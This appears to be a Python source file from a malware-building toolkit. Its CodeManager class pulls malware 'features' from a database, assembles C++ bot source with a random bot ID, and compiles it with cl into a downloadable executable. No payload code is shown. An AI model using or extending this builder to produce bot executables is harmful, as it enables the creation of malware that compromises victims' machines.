import os
import subprocess
import datetime
import re
import SourceCode
# toolkit_path = getcwd() + '\malware_toolkit'
# sys.path.insert(0, toolkit_path)
import DAO
import MalwareFeatures
import random, string

def generateBotID():
    return ''.join(random.choice(string.ascii_uppercase + \
                                 string.ascii_lowercase + \
                                 string.digits) for _ in range(32))

class CodeManager:
    'Class for managing source code'
    buildOutputFile = 'build.log'
    sourceCodeDirectory = 'malware_compiler\\source_files\\'
    buildDirectory = 'static\\compiled_samples\\'
    date_fmt = '%m_%d_%Y_%H_%M_%S'

    def __init__(self):
        self.sourceCodeObj = SourceCode.SourceCode()
        self.currentBotID = generateBotID()
        self.compilerArgs = []

    def start_basic_bot_sample(self):
        self.sourceCodeObj.add_func_imports('#include <iostream>')
        # self.sourceCodeObj.add_func_imports('#include "lib\ConditionHandlers.h"')
        self.sourceCodeObj.add_global_variable('char *BOT_ID = \"' + self.currentBotID + '\";')
        # the condition handler function, selfDelete... are needed all the time
        # so include their library, depending on the one selected in the toolkit
        # a #define will call the appropriate function
        # hfObj = self.create_feature_object("Handle Failed Condition")
        self.compilerArgs.append('lib\ConditionHandlers.cpp')
        # self.add_malware_feature(hfObj)

    # generates the command line argument to build the sample
    def generateCompilerCommand(self, exe_file_name, source_file_name):
        buildCmd = 'cl /Fe' + self.buildDirectory + exe_file_name + ' ' \
            + (self.sourceCodeDirectory + source_file_name)
        for c in self.compilerArgs:
            buildCmd += ' ' + self.sourceCodeDirectory + c
        return buildCmd

    # accesses the database to create a MalwareFeature object that can be
    # used by the sourcecode class to assemble a .cpp
    def create_feature_object(self, feature):
        feat = DAO.get_python_feature_obj(feature)
        i = 0
        # iterate over every function name in the list and get a python object
        # for that function, replace the list element with this object
        while i < len(feat['functions']):
            feat['functions'][i] = DAO.get_python_function_obj(feat['functions'][i])
            i += 1

        malwareFeat = MalwareFeatures.MalwareFeature()
        for func in feat['functions']:
            print("adding " + func['name'] + " to the Feature")
            if len(func['imports']) > 0:
                malwareFeat.add_func_imports(func['imports'])
            if len(func['globals']) > 0:
                malwareFeat.add_global_variables(func['globals'])
            malwareFeat.add_func_declarations(func['header'])
            malwareFeat.add_func_definitions(func['definition'])

        malwareFeat.add_feat_body(feat['body'])
        malwareFeat.set_feat_priority(feat['priority'])
        return malwareFeat

    # adds header, defition and function call to the source code object
    # feature_obj is an object of the class MalwareFeature
    def add_malware_feature(self, feature_obj):
        self.sourceCodeObj.add_func_imports(feature_obj.get_func_imports())
        self.sourceCodeObj.add_func_declaration(feature_obj.get_func_declarations())
        self.sourceCodeObj.add_global_variable(feature_obj.get_global_variables())
        self.sourceCodeObj.add_func_definition(feature_obj.get_func_definitions())
        self.sourceCodeObj.add_line_to_main(feature_obj.get_feat_body())

    # prints build results to a file specified in the global scope
    # output_filename - the file to open and write the output to
    # buid_cmd - the commmand that was executed
    # build_output - the results of the command
    def log_build_results(self, output_filename, build_cmd, build_err, build_out):
        output_log = open(output_filename, 'a')
        output_log.write('--------------------------------------------------\n')
        date = datetime.datetime.now().date()
        time = datetime.datetime.now().time()
        output_log.write('Time: ' + str(date) + ' ' + str(time) + '\n')
        output_log.write("Build Command: " + str(build_cmd) + '\n')
        output_log.write(str(build_err))
        output_log.write('Build Error:\n' + str(build_out) + '\n')
        output_log.write('--------------------------------------------------\n')
        output_log.close()

    # calls g++ to build the source file into an executable
    # source_file_name - the name of the source code file
    def build_executable(self, source_file_name):
        # 0: success, -1: failure
        buildRes = -1
        botID = -1
        date = datetime.datetime.now()
        exe_file_name = date.strftime(self.date_fmt) + '.exe'

        # have the sourceCodeObj export the code to a file
        if os.path.isfile(self.sourceCodeDirectory + source_file_name):
            os.remove(self.sourceCodeDirectory + source_file_name)
        self.sourceCodeObj.export_code(self.sourceCodeDirectory + source_file_name)
        # check if the sourceCode File exist first
        if os.path.isfile(self.sourceCodeDirectory + source_file_name):
            # build the command line string
            buildCmd = self.generateCompilerCommand(exe_file_name, source_file_name)
            # buildCmd = 'g++ -o ' + exe_file_name + ' ' + source_file_name
            proc = subprocess.Popen(buildCmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
            (stdout, stderr) = proc.communicate()

            # since 'cl' always outputs some copyright text to stderr, and actual
            # check if the exe exists to determine if the build was a success
            if os.path.isfile(self.buildDirectory + exe_file_name):
                print("Build Successful")
                # return the path to the exe so the user can download it
                buildRes = self.buildDirectory + exe_file_name
                botID = self.currentBotID
            else:
                print("Build Failed")
                self.log_build_results(self.buildOutputFile, buildCmd, stderr, stdout)
                buildRes = -1
            # clear source code state, whether build was successful or not
            # so it is ready for the next build
            self.sourceCodeObj.clearState()
        else:
            print("Source code file does not exist")
            buildRes = -1
        return [buildRes, botID]
